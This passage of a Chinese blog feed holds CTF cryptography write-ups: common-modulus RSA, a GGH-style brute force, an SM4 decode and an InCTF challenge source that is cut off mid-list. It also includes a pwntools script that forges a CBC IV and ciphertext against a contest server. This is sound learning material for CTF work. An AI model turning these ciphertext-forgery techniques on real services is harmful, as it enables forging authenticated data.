class="number">4</span>] = <span class="string">b&#x27;\x89&#x27;</span></span><br><span class="line">key[<span class="number">5</span>] = <span class="string">b&#x27;\xAB&#x27;</span></span><br><span class="line">key[<span class="number">6</span>] = <span class="string">b&#x27;\xCD&#x27;</span></span><br><span class="line">key[<span class="number">7</span>] = <span class="string">b&#x27;\xEF&#x27;</span></span><br><span class="line">key[<span class="number">8</span>] = <span class="string">b&#x27;\xFE&#x27;</span></span><br><span class="line">key[<span class="number">9</span>] = <span class="string">b&#x27;\xDC&#x27;</span></span><br><span class="line">key[<span class="number">10</span>] = <span class="string">b&#x27;\xBA&#x27;</span></span><br><span class="line">key[<span class="number">11</span>] = <span class="string">b&#x27;\x98&#x27;</span></span><br><span class="line">key[<span class="number">12</span>] = <span class="string">b&#x27;v&#x27;</span></span><br><span class="line">key[<span class="number">13</span>] = <span class="string">b&#x27;T&#x27;</span></span><br><span class="line">key[<span class="number">14</span>] = <span class="string">b&#x27;2&#x27;</span></span><br><span class="line">key[<span class="number">15</span>] = <span class="string">b&#x27;\x10&#x27;</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;&#x27;</span>.join(key)</span><br><span class="line">plaintext = <span class="built_in">bytes</span>(cipher2)</span><br><span class="line">sm4 = SM4Cipher(key)</span><br><span class="line">plain2 = sm4.decrypt(plaintext).decode()</span><br><span class="line"></span><br><span class="line">check_box = [<span class="number">7856030</span>,<span class="number">7856049</span>,<span class="number">7856004</span>,<span class="number">7856004</span>,<span class="number">7856854</span>,<span class="number">7856004</span>,<span class="number">7856045</span>,<span class="number">7856004</span>,<span class="number">7856050</span>,<span class="number">7856004</span>,<span class="number">7856004</span>,<span class="number">7856004</span>,<span class="number">7856024</span>,<span class="number">7856004</span>,<span class="number">7856004</span>,<span class="number">7856060</span>,<span class="number">7856004</span>,<span class="number">7856004</span>,<span class="number">7856234</span>,<span class="number">7856004</span>,<span class="number">7856004</span>,<span class="number">7856004</span>,<span class="number">7856100</span>,<span class="number">7856151</span>,<span class="number">7856230</span>,<span class="number">7856233</span>,<span class="number">7856004</span>,<span class="number">7856004</span>,<span class="number">7856235</span>,<span class="number">7856004</span>,<span class="number">7856004</span>,<span class="number">7856004</span>,<span class="number">7856345</span>,<span class="number">7856004</span>,<span class="number">7856004</span>,<span class="number">7856004</span>,<span class="number">7856004</span>,<span class="number">7856104</span>,<span class="number">7856004</span>,<span class="number">7856565</span>,<span class="number">7856666</span>,<span class="number">7856785</span>,<span class="number">7856004</span>,<span class="number">7856004</span>,<span class="number">7856004</span>,<span class="number">7856004</span>,<span class="number">7856004</span>,<span class="number">7856004</span>,<span class="number">7857004</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">trans = [<span class="number">1</span>, <span class="number">7</span>, -<span class="number">1</span>, -<span class="number">7</span>]</span><br><span class="line">start = <span class="number">7856030</span>  <span class="comment"># 1</span></span><br><span class="line">target = <span class="number">7857004</span></span><br><span class="line"><span class="keyword">assert</span> <span class="number">48</span> == check_box.index(target)</span><br><span class="line">c1 = <span class="string">&#x27;a&#x27;</span></span><br><span class="line">c2 = <span class="string">&#x27;b&#x27;</span></span><br><span class="line">mid = check_box[<span class="number">1</span>]</span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">plain3 = c1</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> check_box[index + <span class="number">1</span>] &gt; mid &gt;= check_box[index + <span class="number">7</span>]:</span><br><span class="line">        index = index + <span class="number">1</span></span><br><span class="line">        mid = check_box[index]</span><br><span class="line">        plain3 += c1</span><br><span class="line">    <span class="keyword">elif</span> check_box[index + <span class="number">7</span>] &gt; mid &gt;= check_box[index + <span class="number">1</span>]:</span><br><span class="line">        index = index + <span class="number">7</span></span><br><span class="line">        mid = check_box[index]</span><br><span class="line">        plain3 += c2</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;this seems not to happen&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> mid == target:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;ZJCTF&#123;&#x27;</span> + plain1 + <span class="string">&#x27;_&#x27;</span> + plain2 + <span class="string">&#x27;_&#x27;</span> + plain3 + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># ZJCTF&#123;R0tl3_Sm34@and_abbbaaabbaab&#125;</span></span><br></pre></td></tr></table></figure>

<p>把奇怪的东西去掉</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20211107 陇原战疫</title>
    <url>/posts/a1174b3b/</url>
    <content><![CDATA[<p>昨天看直播两点才睡，第二天十一点醒，edg牛逼</p>
<p>尚师傅ak了，岂可修（虽然起晚了不太好，但尚师傅也是从十二点干到四点半的，搞就完事</p>
<span id="more"></span>

<h1 id="陇原战”疫”2021网络安全大赛"><a href="#陇原战”疫”2021网络安全大赛" class="headerlink" title="陇原战”疫”2021网络安全大赛"></a>陇原战”疫”2021网络安全大赛</h1><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="mostlycommon"><a href="#mostlycommon" class="headerlink" title="mostlycommon"></a>mostlycommon</h3><p>共模再开个方</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e1 = <span class="number">65536</span> // <span class="number">2</span></span><br><span class="line">e2 = <span class="number">270270</span> // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">122031686138696619599914690767764286094562842112088225311503826014006886039069083192974599712685027825111684852235230039182216245029714786480541087105081895339251403738703369399551593882931896392500832061070414483233029067117410952499655482160104027730462740497347212752269589526267504100262707367020244613503</span></span><br><span class="line">c1 = <span class="number">39449016403735405892343507200740098477581039605979603484774347714381635211925585924812727991400278031892391996192354880233130336052873275920425836986816735715003772614138146640312241166362203750473990403841789871473337067450727600486330723461100602952736232306602481565348834811292749547240619400084712149673</span></span><br><span class="line">c2 = <span class="number">43941404835820273964142098782061043522125350280729366116311943171108689108114444447295511969090107129530187119024651382804933594308335681000311125969011096172605146903018110328309963467134604392943061014968838406604211996322468276744714063735786505249416708394394169324315945145477883438003569372460172268277</span></span><br><span class="line"></span><br><span class="line">get_tuple = gmpy2.gcdext(e1, e2)        <span class="comment"># return (g,s,t)   g = gcd(e1,e2) and g = e1*s + e2*t</span></span><br><span class="line"></span><br><span class="line">r = -get_tuple[<span class="number">1</span>]</span><br><span class="line">s = get_tuple[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">a = gmpy2.powmod(gmpy2.invert(c1, n), r, n)</span><br><span class="line">b = gmpy2.powmod(c2, s, n)</span><br><span class="line"></span><br><span class="line">m = gmpy2.f_mod(gmpy2.mul(a,b),n)</span><br><span class="line"><span class="built_in">print</span>(gmpy2.iroot(m, <span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(gmpy2.iroot(m, <span class="number">2</span>)[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure>

<h3 id="easytask（recuring）"><a href="#easytask（recuring）" class="headerlink" title="easytask（recuring）"></a>easytask（recuring）</h3><p>差点以为是和省赛NTRU那样的题目（其实就是</p>
<p>虽然<code>r</code>是完全可以爆破的，但是要3个小时才能跑完（再买个内存条</p>
<p>所以可还行，emmmm，写了个脚本但比赛中没有出（做不进去，组里还一直催项目，我tm，到底知不知道实验室是什么撑起来的，还非得比赛的时候催，瞬间不想做了</p>
<hr>
<p>有能力出，但没出，总结一下几点</p>
<ol>
<li>遍历所有的<code>r</code>不慢，但是不精明的操作（在循环中生成AES解密）会导致空间复杂度很大，导致程序非常慢</li>
<li>赛后问尚师傅，其实真正的<code>r</code>开头是<code>-3 -2</code>（应该是刻意为之），所以尽管空间复杂度很大，但是比赛中还是遍历到了，判断机制写得不对（马虎，还有别的原因</li>
<li>综上，判断机制不是非得是<code>flag.starswith(b&#39;flag&#39;)</code>，求出来的<code>m</code>很有特征的；可以学尚师傅，先自己定个<code>r</code>，然后用脚本跑一遍（处理大数据，阳哥的样本方法</li>
<li>比赛中先算出<code>r</code>保存在内存里，再开始遍历</li>
</ol>
<p>调整后的脚本快多了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;1070260d8986d5e3c4b7e672a6f1ef2c185c7fff682f99cc4a8e49cfce168aa0&#x27;</span></span><br><span class="line">c = <span class="built_in">bytes</span>.fromhex(c)</span><br><span class="line">ct_e = <span class="string">&#x27;[151991736758354 115130361237591  58905390613532 130965235357066  74614897867998  48099459442369  45894485782943   7933340009592     25794185638]&#x27;</span></span><br><span class="line">ct_W = <span class="string">&#x27;&#x27;&#x27;[-10150241248 -11679953514  -8802490385 -12260198788 -10290571893   -334269043 -11669932300  -2158827458     -7021995]</span></span><br><span class="line"><span class="string">[ 52255960212  48054224859  28230779201  43264260760  20836572799   8191198018  14000400181   4370731005     14251110]</span></span><br><span class="line"><span class="string">[  2274129180  -1678741826  -1009050115   1858488045    978763435   4717368685   -561197285  -1999440633     -6540190]</span></span><br><span class="line"><span class="string">[ 45454841384  34351838833  19058600591  39744104894  21481706222  14785555279  13193105539   2306952916      7501297]</span></span><br><span class="line"><span class="string">[-16804706629 -13041485360  -8292982763 -16801260566  -9211427035  -4808377155  -6530124040  -2572433293     -8393737]</span></span><br><span class="line"><span class="string">[ 28223439540  19293284310   5217202426  27179839904  23182044384  10788207024  18495479452   4007452688     13046387]</span></span><br><span class="line"><span class="string">[   968256091  -1507028552   1677187853   8685590653   9696793863   2942265602  10534454095   2668834317      8694828]</span></span><br><span class="line"><span class="string">[ 33556338459  26577210571  16558795385  28327066095  10684900266   9113388576   2446282316   -173705548      -577070]</span></span><br><span class="line"><span class="string">[ 35404775180  32321129676  15071970630  24947264815  14402999486   5857384379  10620159241   2408185012      7841686]&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">e = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> re.findall(<span class="string">r&quot;\d+&quot;</span>, ct_e):</span><br><span class="line">    e.append(<span class="built_in">int</span>(i))</span><br><span class="line">e = matrix(e)</span><br><span class="line"></span><br><span class="line">W = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>)]</span><br><span class="line">ct_W = re.findall(<span class="string">r&#x27;-?\d+&#x27;</span>, ct_W)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ct_W)):</span><br><span class="line">    W[i // <span class="number">9</span>][i % <span class="number">9</span>] = <span class="built_in">int</span>(ct_W[i])</span><br><span class="line">W = matrix(W)</span><br><span class="line">inv_W = W.inverse()</span><br><span class="line"></span><br><span class="line">table = [_ <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">3</span>, <span class="number">4</span>)]</span><br><span class="line">r = product(table, repeat=<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ri <span class="keyword">in</span> r:</span><br><span class="line">    rx = matrix(ri)</span><br><span class="line">    m = (e - rx) * inv_W</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt; m[<span class="number">0</span>][<span class="number">0</span>] &lt; <span class="number">1024</span>:</span><br><span class="line">        M = <span class="built_in">list</span>(m[<span class="number">0</span>])</span><br><span class="line">        key = hashlib.sha256(<span class="built_in">str</span>(M).encode()).digest()</span><br><span class="line">        cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">        flag = cipher.decrypt(c)</span><br><span class="line">        <span class="keyword">if</span> flag.startswith(<span class="string">b&#x27;flag&#x27;</span>) <span class="keyword">or</span> flag.startswith(<span class="string">b&#x27;SET&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(r)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>让我看看之前的脚本为啥不能出</p>
<p>我们自己写一个<code>r</code>，就<code>[-3,-3,-3,-3,-3,-3]</code>吧，然后走一遍，我知道了，是这个问题</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">M = <span class="built_in">list</span>(m[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>

<p>sage矩阵转列表的时候要多取一个，差不多是这么一个意思吧</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211108072631010.png" alt="image-20211108072631010"></p>
<p>寄</p>
<hr>
<p>竟然是非预期，做的时候也想着用格来做，但直接爆破还是太诱人了，网上搜来竟然有原题，寄？</p>
<p><a href="https://hxp.io/blog/26/VolgaCTF-2016-Quals-crypto300-XXY-writeup/">https://hxp.io/blog/26/VolgaCTF-2016-Quals-crypto300-XXY-writeup/</a></p>
<p>经过一番搜索后发现原来这是GHH加密，la佬格密码那篇有，学习一下</p>
<p><a href="https://4xwi11.github.io/posts/4dab5237/">https://4xwi11.github.io/posts/4dab5237/</a>    </p>
<h3 id="Civet-cat-for-Prince（recuring"><a href="#Civet-cat-for-Prince（recuring" class="headerlink" title="Civet cat for Prince（recuring)"></a>Civet cat for Prince（recuring)</h3><p>代码小饶</p>
<hr>
<p>目的，已知IV，可以获得<code>输入name+&#39;a_cat_permission&#39;</code>的密文，可以有最多两次自己输入IV和密文进行解密，求<code>输入name+&#39;Princepermission&#39;</code>的密文，<strong>注意最后这里我们可以自己定义IV</strong></p>
<p>重点是最后一句话，这就是利用点，复现的时候我一个上午都没注意到，以为是要用它的IV；然后下午看到，那就比较简单了</p>
<p>一个小思路，假设获取的<code>name_cipher</code>$c$分成前半段$c_1,\ c_2$，密文构造成<br>$$<br>c_1\oplus a_cat_permission\ \oplus Princepermission + c_2<br>$$<br>这样第二段密文解密出来就是<code>Princepermission</code></p>
<p>然后利用一次解密的机会，将上面这个密文的前半段和系统的IV丢进去，得到的结果记为$m_1$，求<br>$$<br>m_1\oplus IV \oplus Princepermission<br>$$<br>这样解密出来的第一段就是<code>Princepermission</code>，其实name无所谓什么都可以</p>
<p>到此这道题已经被我们攻破，可能有点绕，但是海星</p>
<p>写了个jo本，源文件改过了？打本地可以，远程有时候可以，可能是有些结果有换行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">table = string.ascii_letters + string.digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solve</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># self.sh = remote(&#x27;192.168.56.1&#x27;, 10005)</span></span><br><span class="line">        self.sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29129</span>)</span><br><span class="line">        self._Princepermission = <span class="string">b&#x27;Princepermission&#x27;</span></span><br><span class="line">        self._a_cat_permission = <span class="string">b&#x27;a_cat_permission&#x27;</span></span><br><span class="line">        self.iv = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        self.cipher_name = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        self.payload_cipher = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        self.payload_iv = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        [+] sha256(XXXX+Q3kqSv2c) == e9ded46c9d0dbcf14d8c36852678fe59daec43b1025c282738a81e7ea9f395f9</span></span><br><span class="line"><span class="string">        [+] Give Me XXXX :</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        proof = self.sh.recvline()</span><br><span class="line">        tail = proof[<span class="number">16</span>:<span class="number">24</span>].decode()</span><br><span class="line">        HASH = proof[<span class="number">29</span>:<span class="number">93</span>].decode()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> product(table, repeat=<span class="number">4</span>):</span><br><span class="line">            head = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">            t = hashlib.sha256((head + tail).encode()).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> t == HASH:</span><br><span class="line">                self.sh.recvuntil(<span class="string">b&#x27;[+] Give Me XXXX :&#x27;</span>)</span><br><span class="line">                self.sh.sendline(head.encode())</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">solve_BANNER</span>(<span class="params">self, _name</span>):</span></span><br><span class="line">        self.sh.sendlineafter(<span class="string">b&#x27;[-]&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        self.sh.sendlineafter(<span class="string">b&#x27;[-]&#x27;</span>, _name)</span><br><span class="line">        self.sh.recvline()</span><br><span class="line">        self.sh.recvline()</span><br><span class="line">        self.sh.recvuntil(<span class="string">b&#x27;Miao~ &#x27;</span>)</span><br><span class="line">        self.iv = self.sh.recvuntil(<span class="string">b&quot;I&#x27;m a&quot;</span>)[:-<span class="number">6</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">len</span>(self.iv))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">solve_NAME</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.sh.sendlineafter(<span class="string">b&#x27;[-]&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        self.sh.recvuntil(<span class="string">b&#x27;Permission:&#x27;</span>)</span><br><span class="line">        self.cipher_name = self.sh.recvuntil(<span class="string">b&quot;I&#x27;m a&quot;</span>)[:-<span class="number">6</span>]</span><br><span class="line">        self.cipher_name = self.cipher_name</span><br><span class="line">        self.payload_cipher = xor(xor(self.cipher_name[:<span class="number">16</span>], self._a_cat_permission),</span><br><span class="line">                                  self._Princepermission) + self.cipher_name[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">solve_Princepermission</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.sh.sendlineafter(<span class="string">b&#x27;[-]&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        self.sh.sendlineafter(<span class="string">b&#x27;[-]&#x27;</span>, self.payload_cipher[:<span class="number">16</span>])</span><br><span class="line">        self.sh.sendlineafter(<span class="string">b&#x27;[-]&#x27;</span>, self.iv)</span><br><span class="line">        self.sh.recvuntil(<span class="string">b&#x27;The message is &#x27;</span>)</span><br><span class="line">        self.payload_iv = xor(xor(self.sh.recvuntil(<span class="string">b&#x27;1.getpermission&#x27;</span>)[:<span class="number">16</span>], self.iv), self._Princepermission)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">solve_flag</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.sh.sendlineafter(<span class="string">b&#x27;[-]&#x27;</span>, self.payload_cipher)</span><br><span class="line">        self.sh.sendlineafter(<span class="string">b&#x27;[-]&#x27;</span>, self.payload_iv)</span><br><span class="line">        self.sh.recvuntil(<span class="string">b&#x27;The prince asked me to tell you this:\n&#x27;</span>)</span><br><span class="line">        flag = self.sh.recvline()</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.proof_of_work()</span><br><span class="line">        self.solve_BANNER(self._Princepermission)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># get cipher_name</span></span><br><span class="line">        <span class="comment"># chance ====&gt; 2</span></span><br><span class="line">        self.solve_NAME()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># get cipher_Princepermission</span></span><br><span class="line">        <span class="comment"># chance ====&gt; 1</span></span><br><span class="line">        self.solve_Princepermission()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># chance ====&gt; 0</span></span><br><span class="line">        self.sh.sendlineafter(<span class="string">b&#x27;[-]&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># get flag</span></span><br><span class="line">        self.solve_flag()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solution = Solve()</span><br><span class="line">    solution.solve()</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211108161217066.png" alt="image-20211108161217066"></p>
<p>好一个狸猫换太子</p>
<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="EasyRe"><a href="#EasyRe" class="headerlink" title="EasyRe"></a>EasyRe</h3><p>反编译失败，查了好久，尝试平衡栈，手动修无果，然后想起一开始看到一串32位的字符串没用到，随便搜了下竟然是<code>hello world</code>的md5，抱着试一试的心态丢进去就对了</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211107141510771.png" alt="image-20211107141510771"></p>
<p>xs</p>
<hr>
<p>还是太容易被别人影响了</p>
<p>努力很廉价，也很昂贵，对自己来说廉价，对别人来说昂贵</p>
<p>你在楼上看到的风景，我选择贴地接近</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210814 InCTF RACTF SSTFCrypto&amp;OSINT方向部分WP</title>
    <url>/posts/becd8ce9/</url>
    <content><![CDATA[<p>第一次玩社工题</p>
<span id="more"></span>

<h1 id="InCTF"><a href="#InCTF" class="headerlink" title="InCTF"></a>InCTF</h1><h2 id="Crypto-Gold-digger"><a href="#Crypto-Gold-digger" class="headerlink" title="Crypto-Gold_digger"></a>Crypto-Gold_digger</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag=<span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">msg, N,x</span>):</span></span><br><span class="line">    msg, ciphertexts = <span class="built_in">bin</span>(bytes_to_long(msg))[<span class="number">2</span>:], []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> msg:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            r = random.randint(<span class="number">1</span>, N)</span><br><span class="line">            <span class="keyword">if</span> gcd(r, N) == <span class="number">1</span>:</span><br><span class="line">                bin_r = <span class="built_in">bin</span>(r)[<span class="number">2</span>:]</span><br><span class="line">                c = (<span class="built_in">pow</span>(x, <span class="built_in">int</span>(bin_r + i, <span class="number">2</span>), N) * r ** <span class="number">2</span>) % N</span><br><span class="line">                ciphertexts.append(c)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> ciphertexts</span><br><span class="line"></span><br><span class="line">N = <span class="number">76412591878589062218268295214588155113848214591159651706606899098148826991765244918845852654692521227796262805383954625826786269714537214851151966113019</span></span><br><span class="line"></span><br><span class="line">x = <span class="number">72734035256658283650328188108558881627733900313945552572062845397682235996608686482192322284661734065398540319882182671287066089407681557887237904496283</span></span><br><span class="line"></span><br><span class="line">flag = (encrypt(flag,N,x))</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;handout.txt&quot;</span>,<span class="string">&quot;w&quot;</span>).write(<span class="string">&quot;ct:&quot;</span>+<span class="built_in">str</span>(flag)+<span class="string">&quot;\n\nN:&quot;</span>+<span class="built_in">str</span>(N)+<span class="string">&quot;\n\nx:&quot;</span>+<span class="built_in">str</span>(x))</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ct = [3266754124418328672247866726679755848701520371443746634280907120024788951726790644565764235065010905480462052367779604906344974859812257431783971523801, 3910983850369346009480778834354740700744997092428714236904249742230620033736627429141128095231382899913639523058150705425021618891808444602545149939881, 27317810920765841342086929111042193579497353621610031484780035299001131982878467015665982909548553024787488715133220729973409548284520639203793990800234, 19049253826935282403928205549454387993361811589455900176398242634533643728656774386121481735599403129610194786842490901299693831767348811888295572944767, 46808271552976597930710682808639501725087745986478512439110229094106054260700609611651592136108105668095803793135384187386798141424456627246934054212204, 64663556663887876448521825389171681970226171803335047116994602631060184771208916838907061325157227065717836207677682181791737509930934478006410977305334, 71370989878902473729538075992611793835381097916199691855392840013136471258314666533631139620910819776545627240136734304044689167904095661008959427867080, 5120760109829368119622569216249179916662286493867330392301836160719483165296740657195693270825905530901001014831402378828989266553129276910799248011107, 25246762200155764725674915117428266946351252223920353292846537142043123004108726846560540427413694348662172063837532573805768559923596757914542578491702, 49840420035538562259818077270014233135437467586063205683943769627434293016547018393482060398482431118280370380641405128927430840198536985630649859298809, 84232356416028819831566679779591187299787046636995543449314912076840614265866721410586346948877186101748353344277333107087862936903079928428665929615, 56255989340747188472994001728565823905145449088080608312012473951209435572526372645545998691635581191431650844541918635345655144222239028951168850704422, 45785662740328453859890278502445450606890445328720454060032120470673511251330845850132591950890320517787732079986810994883608872640852386167756195212718, 54029870403864304285925769805259101311108719589466350768320792251083544066361265116520351278475192456130712826836166473186592532002794991923508524064620, 46624268375793936417415940726172495902868488296085533559474078710715899350421256180929703375516133001459740255662121433900562906914369420876721969039630, 15921219479965848802750013085928522470790034679969324752503581385316275799836521901155562358852385602763599760409651828923729107636248359311532535412386, 20190562475428250717792767608071965792428019405686414394515731600072635056217537304104019807474440130549050089029499956554142652193502911411782760901078, 41983059548033663270367946174234103357083211319135434721003248220792550449588248783877660929189053228157142988622736136441291989249080446689516065393435, 71609539411413240194556215042709157212260128588149087141493760115962392075268935955309314240733799741213805554924840687486128939284886391947755983910372, 48382284720865851648431016945797183660266155498343626372038256476287293528764330285514661435350058162782747986164808116116765643203666318480114386099343, 46730320638656612110889821918114226564809934661179594844549753878327086621670111917286750423548271235812428733761683357631975738361840732519608444014971, 55158112951581407023186496177304925445962183673199215662079568367093310059249411803313113095482726739394326470492736668839734286312650343715767983610363, 37112980203698874196497763225414417374526380133937967213841831269520374856619110460606542911440228172533968362786931746291414834514997777285267403140559, 63322083017732869600484256664107952565424442164218942893502809096945827312745918616246499734990787742358551946831008809185624657787375819807019566756170, 7131499419559104886376982790578102463139236264237964490683901837397932220525370218090186039561412497537162063460706345433646970829567561962759102801409, 58987942295441295007027662413419316243220623197071846210550338622495407069803847200822547917184493216087823262589570286179930999452321610193662415873715, 40463068017819882296397975257296430843199918804116579332129293544451758450871632123477648266871632208235745045407313414566869271527363707673269415792748, 63039255605860594706235701802182469722575918347437216391785141811844940190196047005143996180367679119101277408375635148536688180427946019402484987272510, 71847518795481381405870318786706930914683598350750876400219210332724219278096576686583523369096072741462359686018334607665415715621892012499046687826381, 26337284123753874828319186304791211620930566566120195495665155862853854859543475630545175774334287940418892288697324254994533678098095744373749417045163, 21764014175912521244824061176843027159941043924315159175826402721445924610127916171029483226782579782895796672888523861781938366363972830257845406910975, 3435623095726196844062581172306260159832381716480005885061523285318057788012070798019652466654719345533109449262217283547667486720590207050726788521007, 45919770921828919777762020824998206274312663582623531457423945627938988437572523960733207639926323480092557203738058449123337560810938710160906364447620, 10316176533060759533513950331093265748621797961634020464599935470363429799039909475463319253036787910300618231860969786155510737831206632050394210070451, 59917326034119369331371808884574791893663783551610720886605582940613080599142224466706727532690507606452696459627055492221262118596727675146540248450673, 10842419169283306075038519352806019318831568946592817182841197553628341894023325198625377701960932683672886924641591814480224960323114162850149838499007, 66742064034192815235690238007451310177229882619802417230057418182591053854863990729434269230203542276063435489487230228617313299686445072114861937495520, 17337799506489098810311640536792733150718613880893950634528762031894931254405830986337609675999763577152750890798518494436701133617817677416137197595268, 11805355039774973413960279981353089487026545524788641978782960297317350024970913592970423213016483957303390870999692309756230863161264738948268751555880, 59489883634739735974968870045855217812381229180244297407474712914329781106395937678986012546789197922278383445284656100208400201934959073937202913889830, 11401451000912707217036107785027425488005850574045702577420854119932133317734234141433888477046072783546143158822115361906593423801947424855735138806051, 